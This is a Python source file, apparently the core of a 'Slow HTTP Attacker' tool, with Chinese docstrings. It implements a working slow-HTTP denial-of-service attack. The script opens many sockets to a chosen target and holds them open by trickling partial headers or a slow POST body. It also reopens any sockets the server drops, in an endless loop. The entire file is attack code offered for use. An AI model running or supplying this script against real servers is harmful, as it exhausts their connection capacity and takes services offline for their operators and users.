import logging
import random
import socket
import time
import string
import ssl
from enum import Enum
from args_parser import get_args
from socket_utils import send_line, send_header, send_utf8
from constants import user_agents


class Mode(Enum):
    HEADER = 1
    POST = 2
    READ = 3


def init_socket(mode, host, port, https, randuseragent):
    """
    初始化一个用于 HTTP/HTTPS 的 socket
    :param mode: Mode 类型, 攻击模式
    :param host: str, 目标主机
    :param port: int, 目标端口
    :param https: boolean, 是否使用 https
    :param randuseragent: boolean, 是否使用随机 User-Agent
    :return:
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)

    if https:
        s = ssl.wrap_socket(s)

    s.connect((host, port))

    ua = user_agents[0]
    if randuseragent:
        ua = random.choice(user_agents)

    if mode == Mode.HEADER:
        send_line(s, f"GET /?{random.randint(0, 2000)} HTTP/1.1")
        send_header(s, "Host", host)
        send_header(s, "User-Agent", ua)
        send_header(s, "Accept-language", "en-US,en,q=0.5")
    elif mode == Mode.POST:
        send_line(s, f"POST /?{random.randint(0, 2000)} HTTP/1.1")
        send_header(s, "Host", host)
        send_header(s, "User-Agent", ua)
        send_header(s, "Accept-language", "en-US,en,q=0.5")
        send_header(s, "Content-Length", random.randint(4000, 5000))
        send_header(s, "Content-Type", "application/x-www-form-urlencoded")
        send_line(s)
    return s


def attack(mode, host, port, sockets, sleeptime, https, randuseragent):
    """
    发起攻击
    :param mode: Mode 类型, 攻击模式
    :param host: str, 目标主机
    :param port: int, 目标端口
    :param sockets: int, 并发数
    :param sleeptime: int, 两次发送以维持 socket 不断开的间隔时间
    :param https: boolean, 是否使用 https
    :param randuseragent: boolean, 是否使用随机 User-Agent
    :return:
    """
    list_of_sockets = []
    ip = host
    socket_count = sockets
    logging.info("Attacking %s with %s sockets.", ip, socket_count)

    logging.info("Creating sockets...")
    for _ in range(socket_count):
        try:
            logging.debug("Creating socket nr %s", _)
            s = init_socket(mode, ip, port, https, randuseragent)
        except socket.error as e:
            logging.debug(e)
            break
        list_of_sockets.append(s)

    while True:
        try:
            # Send a beat
            logging.info(
                "Sending a beat... Socket count: %s",
                len(list_of_sockets),
            )
            for s in list(list_of_sockets):
                try:
                    if mode == Mode.HEADER:
                        send_header(s, "X-a", random.randint(1, 5000))
                    elif mode == Mode.POST:
                        send_utf8(s, ''.join(random.choices(string.ascii_letters, k=7)) + '=' + ''.join(random.choices(string.ascii_letters, k=3)) + '&')
                except socket.error:
                    list_of_sockets.remove(s)

            # Recreate sockets
            logging.debug("Recreating sockets...")
            for _ in range(socket_count - len(list_of_sockets)):
                try:
                    s = init_socket(mode, ip, port, https, randuseragent)
                    logging.debug("Recreating socket")
                    if s:
                        list_of_sockets.append(s)
                except socket.error as e:
                    logging.debug(e)
                    break
            logging.debug("Sleeping for %d seconds", sleeptime)
            time.sleep(sleeptime)

        except (KeyboardInterrupt, SystemExit):
            logging.info("Stopping Slow HTTP Attacker")
            break


if __name__ == "__main__":
    args = get_args()
    attack(Mode[args.mode.upper()], args.host, args.port, args.sockets, args.sleeptime, args.https, args.randuseragent)
